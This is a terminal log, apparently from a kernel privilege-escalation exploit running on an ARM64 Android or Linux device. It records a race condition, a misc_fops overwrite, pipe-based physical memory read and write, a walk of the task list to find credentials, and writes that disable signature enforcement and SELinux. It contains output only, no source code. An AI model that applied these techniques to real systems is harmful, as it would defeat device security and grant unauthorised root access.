+[33m[*] [0mslide pselect blocked ready=-1 ready_usec=0 ready_wchan=<not-read> guard=-1 guard_usec=0 guard_wchan=<not-read> age_usec=0 tid=23869
+[33m[*] [0mslide res-encode consumer firing sched_setattr tid=23869
+[33m[*] [0mslide pselect blocked ready=-1 ready_usec=0 ready_wchan=<not-read> guard=-1 guard_usec=0 guard_wchan=<not-read> age_usec=0 tid=23869
+[33m[*] [0mslide res-encode consumer firing sched_setattr tid=23869
+[33m[*] [0mslide pselect blocked ready=-1 ready_usec=0 ready_wchan=<not-read> guard=-1 guard_usec=0 guard_wchan=<not-read> age_usec=0 tid=23869
+[33m[*] [0mslide sigreturn spin-done sched_ok=4 window=1
+[33m[*] [0mslide downstream verification armed sched_ok=1 write_window=1
+[33m[*] [0mslide child trigger_write RETURNING waiter_ok=1 sched_ok=1 consume_calls=4
+[33m[*] [0mslide child trigger_write PTRET sched_ok=1
+[33m[*] [0mCP: child-result child_result=1 sched_ok=4 waiter_ok=1 write_window=1
+[33m[*] [0mslide post-waitpid child=23868 wp=0 status=0 reaped=0 child_done=1 sched_ok=1 waiter_ok=1
+[33m[*] [0mp0 physical write status=0 ok=1
+[33m[*] [0mcfi lseek probe SKIPPED (geo119): llseek is the rb_erase clobber slot; verification uses the pread-based configfs channel instead
+[33m[*] [0mcfi lseek oracle preopen_fd=3 ret=-1 errno=0 | new_fd=4 ret=-1 errno=0 replaced=0
+[33m[*] [0mcfi fd-diff SKIPPED (CFI_SKIP_VERIFY=1): trusting write landed, jumping to write_confirmed
+[33m[*] [0mcfi restoring misc_fops target=ffffffe0b253c340 value=ffffffe0b1274ae8
+[33m[*] [0mcfi misc_fops readback ret=8 val=ffffffe0b1274ae8 (restored)
+[33m[*] [0mcfi starting pipe physrw
+[33m[*] [0mpipe caches normal1k=ffffff8001cf6700 normal2k=ffffff8001cf6800 cgroup1k=ffffff8001cf7000 cgroup2k=ffffff8001cf7100 selected=ffffff8001cf7100
+[33m[*] [0mpipe page idx=0 page=ffffff889f720000 head=fffffffe227dc800 cache08=0000000000000000 cache10=dead000000000122 cache18=ffffff8001cf6800 cache20=0000000000000000 type=ffffffff match=1
+[33m[*] [0mphys step pipe probe found=1 pipebuf=ffffff889f722000 idx=13 scan=1/1/1
+[33m[*] [0mphys proof spans data=ffffff89499e7000-ffffff89499e7016 qword=ffffff89499e7100-ffffff89499e7107
+[33m[*] [0mphys step probed read done ok=1 idx=13
+[33m[*] [0mphys step probed write done ok=1
+[33m[*] [0mphys step read64 done ok=1 value=306365737562656e
+[33m[*] [0mphys proof64 restore=1 old=0000000000000000 now=0000000000000000
+[33m[*] [0mphys proof restore=1 size=23
+[33m[*] [0mroot configfs-pipe start uid=2000 fd=4
+[33m[*] [0mroot direct: walk start head_img=ffffffc00a0bfc10 head=ffffff802a0bfc10 canon_head=ffffffe0b20bfc10 entry0=ffffff80241d9810 want_tgid=23880
+[33m[*] [0mroot direct: walk i=0 task=ffffff80241d92c0 tgid=1 comm_off=ffffff80241d9b08
+[33m[*] [0mroot direct: walk i=1 task=ffffff80241dcb00 tgid=2 comm_off=ffffff80241dd348
+[33m[*] [0mroot direct: walk i=2 task=ffffff80241dddc0 tgid=3 comm_off=ffffff80241de608
+[33m[*] [0mroot direct: walk i=3 task=ffffff80241da580 tgid=4 comm_off=ffffff80241dadc8
+[33m[*] [0mroot direct: walk i=4 task=ffffff80241d8000 tgid=5 comm_off=ffffff80241d8848
+[33m[*] [0mroot direct: walk i=5 task=ffffff80241db840 tgid=6 comm_off=ffffff80241dc088
+[33m[*] [0mroot direct: walk i=6 task=ffffff8004f6cb00 tgid=7 comm_off=ffffff8004f6d348
+[33m[*] [0mroot direct: walk i=7 task=ffffff8004f6ddc0 tgid=8 comm_off=ffffff8004f6e608
+[33m[*] [0mroot direct: FOUND tgid=23880 task=ffffff887b65a580 at i=956
+[33m[*] [0mroot direct: task=ffffff887b65a580 real_cred=ffffff8811c29c00 cred=ffffff8811c29c00
+[33m[*] [0mroot direct: sig_enforce write ok=1 1->0
+[33m[*] [0mroot direct: boot_id restore ok=1 before=ffffffe0b271dad8 want=ffffffe0b271dad8
+[33m[*] [0mroot direct: selinux write ok=1 1->0 readback=0
